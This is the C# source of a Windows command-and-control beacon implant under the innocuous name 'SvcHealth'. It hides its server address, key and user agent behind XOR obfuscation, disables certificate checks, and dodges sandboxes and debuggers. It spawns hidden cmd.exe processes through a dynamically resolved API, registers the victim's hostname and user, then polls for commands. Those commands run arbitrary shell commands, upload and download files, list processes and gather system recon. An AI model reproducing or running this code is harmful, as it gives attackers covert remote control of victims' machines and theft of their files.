using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace SvcHealth
{
    class Program
    {
        static byte[] _ch = { 0x6B, 0x63, 0x68, 0x74, 0x6B, 0x6C, 0x62, 0x74, 0x6B, 0x74, 0x68, 0x6A, 0x6A };
        static byte[] _cp = { 0x62, 0x6A, 0x62, 0x62 };
        static byte[] _cs = { 0x32, 0x2E, 0x2E, 0x2A };
        static byte[] _ek = { 0x09, 0x15, 0x19, 0x11, 0x0A, 0x0F, 0x0A, 0x0A, 0x1F, 0x0E, 0x09, 0x05, 0x11, 0x1F, 0x03, 0x05, 0x68, 0x6A, 0x68, 0x6C };
        static byte[] _ru = { 0x75, 0x29, 0x2F, 0x38, 0x37, 0x33, 0x2E, 0x77, 0x3C, 0x35, 0x28, 0x37 };
        static byte[] _cu = { 0x75, 0x3B, 0x2A, 0x33, 0x75, 0x2C, 0x6B, 0x75, 0x2F, 0x2A, 0x3E, 0x3B, 0x2E, 0x3F };
        static byte[] _ua = { 0x17, 0x35, 0x20, 0x33, 0x36, 0x36, 0x3B, 0x75, 0x6F, 0x74, 0x6A, 0x7A, 0x72, 0x0D, 0x33, 0x34, 0x3E, 0x35, 0x2D, 0x29, 0x7A, 0x14, 0x0E, 0x7A, 0x6B, 0x6A, 0x74, 0x6A, 0x61, 0x7A, 0x0D, 0x33, 0x34, 0x6C, 0x6E, 0x61, 0x7A, 0x22, 0x6C, 0x6E, 0x73, 0x7A, 0x1B, 0x2A, 0x2A, 0x36, 0x3F, 0x0D, 0x3F, 0x38, 0x11, 0x33, 0x2E, 0x75, 0x6F, 0x69, 0x6D, 0x74, 0x69, 0x6C };
        static byte[] _sp = { 0x6B, 0x6D, 0x3F, 0x63, 0x62, 0x69, 0x69, 0x39, 0x6D, 0x69, 0x6F, 0x6D, 0x3E, 0x6B, 0x68, 0x6C, 0x6E, 0x63, 0x6B, 0x63, 0x6F, 0x6A, 0x62, 0x6F, 0x3F, 0x38, 0x38, 0x68, 0x39, 0x38, 0x6B, 0x3E, 0x3E, 0x6C, 0x62, 0x38, 0x3C, 0x38, 0x3C, 0x3C, 0x39, 0x62, 0x6C, 0x3C, 0x63, 0x3B, 0x63, 0x69, 0x6A, 0x6B, 0x6C, 0x6E, 0x3F, 0x38, 0x6E, 0x68, 0x69, 0x63, 0x6C, 0x62, 0x6C, 0x3F, 0x6B, 0x39 };

        static string X(byte[] d) { var c = new char[d.Length]; for (int i = 0; i < d.Length; i++) c[i] = (char)(d[i] ^ 0x5A); return new string(c); }

        static string C2Host;
        static string C2Port;
        static string C2Scheme;
        static string EncKey;
        static int BeaconSleep = 5;
        static int BeaconJitter = 0;
        static string RegisterUri;
        static string CheckinUri;
        static string UserAgent;
        static string ServerPubHex;

        static string AgentId = "";
        static readonly HttpClient Client = CreateClient();
        static HttpClient CreateClient()
        {
            var handler = new HttpClientHandler();
            handler.ServerCertificateCustomValidationCallback = delegate { return true; };
            var c = new HttpClient(handler);
            c.Timeout = TimeSpan.FromSeconds(60);
            return c;
        }

        static void InitConfig()
        {
            C2Host = X(_ch); C2Port = X(_cp); C2Scheme = X(_cs);
            EncKey = X(_ek); RegisterUri = X(_ru); CheckinUri = X(_cu);
            UserAgent = X(_ua); ServerPubHex = X(_sp);
            Array.Clear(_ch, 0, _ch.Length); Array.Clear(_cp, 0, _cp.Length);
            Array.Clear(_cs, 0, _cs.Length); Array.Clear(_ek, 0, _ek.Length);
            Array.Clear(_ru, 0, _ru.Length); Array.Clear(_cu, 0, _cu.Length);
            Array.Clear(_ua, 0, _ua.Length); Array.Clear(_sp, 0, _sp.Length);
            var pub = new byte[32];
            for (int i = 0; i < 32; i++)
                pub[i] = Convert.ToByte(ServerPubHex.Substring(i * 2, 2), 16);
            Eph1.ServerPub = pub;
        }

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
        static extern IntPtr GetModuleHandleA(string name);
        [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
        static extern IntPtr GetProcAddress(IntPtr hMod, string name);

        static bool IsSandbox()
        {
            byte[][] indicators = {
                new byte[] { 0x29, 0x38, 0x33, 0x3F, 0x3E, 0x36, 0x36, 0x74, 0x3E, 0x36, 0x36 },
                new byte[] { 0x3E, 0x38, 0x3D, 0x32, 0x3F, 0x36, 0x2A, 0x74, 0x3E, 0x36, 0x36 },
                new byte[] { 0x3B, 0x2A, 0x33, 0x05, 0x36, 0x35, 0x3D, 0x74, 0x3E, 0x36, 0x36 },
                new byte[] { 0x09, 0x22, 0x13, 0x34, 0x74, 0x3E, 0x36, 0x36 },
                new byte[] { 0x09, 0x3C, 0x68, 0x74, 0x3E, 0x36, 0x36 },
                new byte[] { 0x39, 0x37, 0x3E, 0x2C, 0x28, 0x2E, 0x69, 0x68, 0x74, 0x3E, 0x36, 0x36 }
            };
            for (int i = 0; i < indicators.Length; i++)
                if (GetModuleHandleA(X(indicators[i])) != IntPtr.Zero) return true;
            try
            {
                if (System.IO.Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Recent)).Length < 5) return true;
            }
            catch {}
            return false;
        }

        static string Encrypt(string plaintext) { return Eph1.Encrypt(plaintext); }
        static string Decrypt(string encoded) { return Eph1.Decrypt(encoded); }

        static string HttpPost(string path, string body)
        {
            try
            {
                var url = C2Scheme + "://" + C2Host + ":" + C2Port + path;
                var request = new HttpRequestMessage(HttpMethod.Post, url)
                {
                    Content = new StringContent(body, Encoding.UTF8, "application/x-www-form-urlencoded")
                };
                request.Headers.TryAddWithoutValidation("User-Agent", UserAgent);
                request.Headers.TryAddWithoutValidation("Accept", "text/html,*/*");
                var response = Client.SendAsync(request).Result;
                var respBody = response.Content.ReadAsStringAsync().Result;
                return respBody;
            }
            catch { return ""; }
        }

        static string ExecuteCommand(string cmd)
        {
            if (cmd.StartsWith("__hd:")) return HiddenDesktop.Handle(cmd);
            if (cmd.StartsWith("__bof:")) return BofLoader.Run(cmd);
            if (cmd.StartsWith("__fs:put:"))
            {
                var payload = cmd.Substring(9);
                var tab = payload.IndexOf('\t');
                if (tab < 0) return "fs:put needs path\\tbase64";
                try
                {
                    File.WriteAllBytes(payload.Substring(0, tab), Convert.FromBase64String(payload.Substring(tab + 1)));
                    return "ok wrote " + payload.Substring(0, tab);
                }
                catch { return "write failed"; }
            }
            if (cmd.StartsWith("__fs:get:") || cmd.StartsWith("__px:download:"))
            {
                var path = (cmd.StartsWith("__fs:get:") ? cmd.Substring(9) : cmd.Substring(14)).Trim();
                try { return "FILE:" + Convert.ToBase64String(File.ReadAllBytes(path)); }
                catch { return "read failed"; }
            }
            if (cmd.StartsWith("__fs:ls:")) return NativeLs("ls " + cmd.Substring(8));
            if (cmd == "__px:ps")
            {
                var sb = new StringBuilder();
                foreach (var p in Process.GetProcesses())
                {
                    try { sb.AppendLine(string.Format("{0,6}  {1}", p.Id, p.ProcessName)); }
                    catch {}
                }
                return sb.ToString().TrimEnd();
            }
            if (cmd == "__px:recon")
            {
                var sb = new StringBuilder();
                sb.AppendLine("Hostname: " + Environment.MachineName);
                sb.AppendLine("User: " + Environment.UserDomainName + "\\" + Environment.UserName);
                sb.AppendLine("OS: " + Environment.OSVersion.ToString());
                sb.AppendLine("Dir: " + Directory.GetCurrentDirectory());
                sb.AppendLine("Procs: " + Process.GetProcesses().Length);
                return sb.ToString().TrimEnd();
            }
            if (cmd.StartsWith("cd "))
            {
                try
                {
                    Directory.SetCurrentDirectory(cmd.Substring(3).Trim());
                    return "Changed directory to " + Directory.GetCurrentDirectory();
                }
                catch { return "cd failed"; }
            }
            if (cmd == "pwd") return Directory.GetCurrentDirectory();
            if (cmd == "ls" || cmd == "dir" || cmd.StartsWith("ls ") || cmd.StartsWith("dir "))
                return NativeLs(cmd);
            if (cmd.StartsWith("cat ") || cmd.StartsWith("type "))
            {
                try { return File.ReadAllText(cmd.Substring(cmd.IndexOf(' ') + 1).Trim()); }
                catch { return "read failed"; }
            }

            try { return RunShell(cmd); }
            catch { return "exec failed"; }
        }

        [StructLayout(LayoutKind.Sequential)] struct SECURITY_ATTRIBUTES { public int nLength; public IntPtr lpSecurityDescriptor; public bool bInheritHandle; }
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct SI { public int cb; public string lpReserved; public string lpDesktop; public string lpTitle; public int dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags; public short wSW, cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput, hStdOutput, hStdError; }
        [StructLayout(LayoutKind.Sequential)] struct PI { public IntPtr hProcess, hThread; public int dwProcessId, dwThreadId; }
        [DllImport("kernel32.dll")] static extern bool CreatePipe(out IntPtr hRead, out IntPtr hWrite, ref SECURITY_ATTRIBUTES sa, int size);
        [DllImport("kernel32.dll")] static extern bool SetHandleInformation(IntPtr h, int mask, int flags);
        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        delegate bool DK(string app, string cmd, IntPtr pa, IntPtr ta, bool inherit, int flags, IntPtr env, string dir, ref SI si, out PI pi);
        static byte[] _km = { 0x31, 0x3F, 0x28, 0x34, 0x3F, 0x36, 0x69, 0x68, 0x74, 0x3E, 0x36, 0x36 };
        static byte[] _kn = { 0x19, 0x28, 0x3F, 0x3B, 0x2E, 0x3F, 0x0A, 0x28, 0x35, 0x39, 0x3F, 0x29, 0x29, 0x0D };
        static DK _cpw;
        static DK CpW() { if (_cpw != null) return _cpw; IntPtr h = GetModuleHandleA(X(_km)); if (h == IntPtr.Zero) return null; IntPtr a = GetProcAddress(h, X(_kn)); if (a == IntPtr.Zero) return null; _cpw = (DK)Marshal.GetDelegateForFunctionPointer(a, typeof(DK)); return _cpw; }
        [DllImport("kernel32.dll")] static extern bool ReadFile(IntPtr h, byte[] buf, int toRead, out int read, IntPtr ovl);
        [DllImport("kernel32.dll", EntryPoint = "CloseHandle")] static extern bool CloseH(IntPtr h);
        [DllImport("kernel32.dll")] static extern int WaitForSingleObject(IntPtr h, int ms);
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        static extern bool CreateProcessW(string app, string cmd, IntPtr pa, IntPtr ta, bool inherit, int flags, IntPtr env, string dir, ref SI si, out PI pi);

        static string RunShell(string cmd)
        {
            var sa = new SECURITY_ATTRIBUTES { nLength = Marshal.SizeOf(typeof(SECURITY_ATTRIBUTES)), bInheritHandle = true };
            IntPtr outR, outW, errR, errW, inR, inW;
            CreatePipe(out outR, out outW, ref sa, 0);
            SetHandleInformation(outR, 1, 0);
            CreatePipe(out errR, out errW, ref sa, 0);
            SetHandleInformation(errR, 1, 0);
            CreatePipe(out inR, out inW, ref sa, 0);
            SetHandleInformation(inW, 1, 0);
            var si = new SI { cb = Marshal.SizeOf(typeof(SI)), dwFlags = 0x100, wSW = 0, hStdInput = inR, hStdOutput = outW, hStdError = errW };
            var shell = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\cmd.exe";
            PI pi;
            var cpw = CpW();
            bool ok = cpw != null ? cpw(shell, shell + " /C " + cmd, IntPtr.Zero, IntPtr.Zero, true, 0x08000000, IntPtr.Zero, null, ref si, out pi)
                                  : CreateProcessW(shell, shell + " /C " + cmd, IntPtr.Zero, IntPtr.Zero, true, 0x08000000, IntPtr.Zero, null, ref si, out pi);
            CloseH(inR); CloseH(inW);
            if (!ok)
                return "exec failed";
            CloseH(outW);
            CloseH(errW);
            var sb = new StringBuilder();
            var buf = new byte[4096];
            int read;
            while (ReadFile(outR, buf, buf.Length, out read, IntPtr.Zero) && read > 0)
                sb.Append(Encoding.GetEncoding(437).GetString(buf, 0, read));
            while (ReadFile(errR, buf, buf.Length, out read, IntPtr.Zero) && read > 0)
                sb.Append(Encoding.GetEncoding(437).GetString(buf, 0, read));
            CloseH(outR);
            CloseH(errR);
            WaitForSingleObject(pi.hProcess, 30000);
            CloseH(pi.hProcess);
            CloseH(pi.hThread);
            var output = sb.ToString();
            return string.IsNullOrEmpty(output) ? "ok" : output;
        }

        static string NativeLs(string cmd)
        {
            try
            {
                string arg;
                if (cmd.StartsWith("ls ") || cmd.StartsWith("dir "))
                    arg = cmd.Substring(cmd.IndexOf(' ') + 1).Trim();
                else
                    arg = ".";
                if (string.IsNullOrEmpty(arg)) arg = ".";
                var sb = new StringBuilder();
                foreach (var d in Directory.GetDirectories(arg))
                {
                    var di = new DirectoryInfo(d);
                    sb.AppendLine(string.Format("d {0,12}  {1}", "0", di.Name));
                }
                foreach (var f in Directory.GetFiles(arg))
                {
                    var fi = new FileInfo(f);
                    sb.AppendLine(string.Format("- {0,12}  {1}", fi.Length, fi.Name));
                }
                var result = sb.ToString().TrimEnd();
                return string.IsNullOrEmpty(result) ? "Directory is empty" : result;
            }
            catch { return "ls failed"; }
        }

        static bool Register()
        {
            var hostname = Environment.MachineName;
            var username = Environment.UserName;
            var msg = "{\"type\":\"register\",\"metadata\":{\"hostname\":\"" + hostname + "\",\"username\":\"" + username + "\",\"os\":\"Windows\",\"mode\":\"beacon\",\"beacon_interval\":" + BeaconSleep + "}}";
            var enc = Encrypt(msg);
            var resp = HttpPost(RegisterUri, enc);
            if (string.IsNullOrEmpty(resp)) return false;
            var dec = Decrypt(resp);
            if (dec.Contains("\"registered\"") || dec.Contains("\"checkin_ack\""))
            {
                var idx = dec.IndexOf("\"agent_id\":\"");
                if (idx >= 0)
                {
                    var start = idx + 12;
                    var end = dec.IndexOf('"', start);
                    AgentId = dec.Substring(start, end - start);
                    return true;
                }
            }
            return false;
        }

        static List<string> Checkin(List<string> results)
        {
            var resultsJson = results.Count == 0 ? "[]" : "[" + string.Join(",", results) + "]";
            var msg = "{\"type\":\"checkin\",\"agent_id\":\"" + AgentId + "\",\"metadata\":{\"mode\":\"beacon\"},\"results\":" + resultsJson + "}";
            var enc = Encrypt(msg);
            var resp = HttpPost(CheckinUri, enc);
            var commands = new List<string>();
            if (string.IsNullOrEmpty(resp)) return commands;
            var dec = Decrypt(resp);
            if (dec.Contains("\"commands\""))
            {
                var search = "\"command\":\"";
                var pos = 0;
                while ((pos = dec.IndexOf(search, pos)) >= 0)
                {
                    var start = pos + search.Length;
                    var end = dec.IndexOf('"', start);
                    if (end > start) commands.Add(dec.Substring(start, end - start));
                    pos = end + 1;
                }
            }
            return commands;
        }

        const int KillDate = 0;
        const int WorkStart = 0;
        const int WorkEnd = 24;

        static void StealthSleep(int ms)
        {
            Evasion.SleepMask(Math.Max(1, ms), Encoding.UTF8.GetBytes(EncKey));
        }

        static void WaitWindow()
        {
            while (true)
            {
                if (Debugger.IsAttached) Environment.Exit(0);
                var now = DateTime.UtcNow;
                int today = now.Year * 10000 + now.Month * 100 + now.Day;
                if (KillDate > 0 && today > KillDate) Environment.Exit(0);
                if (WorkEnd <= WorkStart || WorkEnd >= 24 || (now.Hour >= WorkStart && now.Hour < WorkEnd)) return;
                Thread.Sleep(60000);
            }
        }

        static void SleepWithJitter()
        {
            var rng = new Random();
            int sleepMs = BeaconSleep * 1000;
            if (BeaconJitter > 0 && BeaconJitter <= 100)
            {
                var jitterRange = BeaconSleep * BeaconJitter / 100.0;
                sleepMs = (int)((BeaconSleep + (rng.NextDouble() * 2 - 1) * jitterRange) * 1000);
            }
            WaitWindow();
            StealthSleep(Math.Max(1000, sleepMs));
        }

        static void Main(string[] args)
        {
            InitConfig();
            WaitWindow();
            if (Environment.ProcessorCount < 2) Thread.Sleep(30000);
            if (IsSandbox()) return;
            try { Evasion.Run(); } catch { }

            for (int i = 0; i < 10 && string.IsNullOrEmpty(AgentId); i++)
            {
                Register();
                if (string.IsNullOrEmpty(AgentId)) Thread.Sleep(5000);
            }
            if (string.IsNullOrEmpty(AgentId)) return;

            var pending = new List<string>();
            while (true)
            {
                var commands = Checkin(pending);
                pending.Clear();

                foreach (var cmd in commands)
                {
                    if (cmd == "__kill") Environment.Exit(0);
                    if (cmd.StartsWith("__set_interval:"))
                    {
                        int newInterval;
                        if (int.TryParse(cmd.Split(':')[1], out newInterval))
                            BeaconSleep = newInterval;
                        continue;
                    }

                    string output;
                    try { output = ExecuteCommand(cmd); }
                    catch (Exception ex) { output = "Error: " + ex.Message; }
                    if (output == null) output = "";
                    var escaped = output.Replace("\\", "\\\\").Replace("\"", "\\\"")
                        .Replace("\n", "\\n").Replace("\r", "\\r");
                    pending.Add("{\"type\":\"response\",\"output\":\"" + escaped + "\",\"command\":\"" + cmd + "\"}");
                }

                SleepWithJitter();
            }
        }
    }
}
